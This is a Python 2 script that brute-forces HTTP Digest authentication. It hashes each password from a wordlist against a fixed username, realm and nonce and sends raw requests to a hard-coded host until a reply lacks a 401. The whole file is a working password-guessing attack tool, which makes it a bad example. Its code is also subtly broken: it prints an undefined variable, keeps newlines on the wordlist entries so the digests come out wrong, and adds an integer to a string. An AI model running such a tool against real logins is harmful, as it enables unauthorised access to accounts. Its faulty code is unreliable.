# -*- coding: UTF-8 -*-

__author__ = 'n30m1nd'

import hashlib
import socket
import time

## Source of the authentication digest implementation:
## http://en.wikipedia.org/wiki/Digest_access_authentication#Overview
#HA1=MD5(username:realm:password)
#HA2=MD5(method:digestURI)

username="YourUsername"
realm="TheRealmToTest"
nonce="00000xxxCAxx0000ttttt" #(not so)Random nonce.
passwords_file = "wordlist.txt"

r_host = "192.168.1.240"
r_port = 1234

uri="/"
method="GET"

#This should be checked against the 'len'gth of the wordlist. 
#But please if your wordlist is 10k words, don't test yourself
#by being 'creative' and putting the word 10k+1 ...
num_sess = raw_input("Last word tried (number id): ") 
num_sess = int(num_sess)

last_word_num = 0
with open(passwords_file) as file:
	passwordlist = file.readlines()
	for pw in passwordlist:
		HA1 = hashlib.md5(username+":"+realm+":"+pw)
		HA2 = hashlib.md5(method+":"+uri)
		hashresponse=hashlib.md5(HA1.hexdigest()+":"+nonce+":"+HA2.hexdigest())
		response=hashresponse.hexdigest()
		try:
			if (last_word_num < num_sess): #Skipping all the words we have already tried
				last_word_num += 1
				continue
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((r_host, r_port))
			payload = 'GET / HTTP/1.1\nHost: '+r_host+':'+str(r_port)+'\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140903 Firefox/24.0 Iceweasel/24.8.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nAuthorization: Digest username="'+username+'", realm="'+realm+'", nonce="'+nonce+'", uri="/", response="'+response+'"\n\n'
			s.send(payload)
			rec = s.recv(1024) #If there's nothing to receive, it will get stuck here...
			print i, rec
			last_word_num += 1
			s.close()
			if ("401" not in rec):
				break
			time.sleep(0.1) #Be gentle with the brute-force...
		except socket.error:
			print "\n[-] Socket error: Waiting 10 seconds to retry..."
			cdown = 10
			while cdown:
				print cdown,
				cdown -= 1
				time.sleep(1)
	else:
		print "\n[-] Not found :("
		exit(0)
raw_input("\n[+] Found at " + last_word_num);
exit(1)






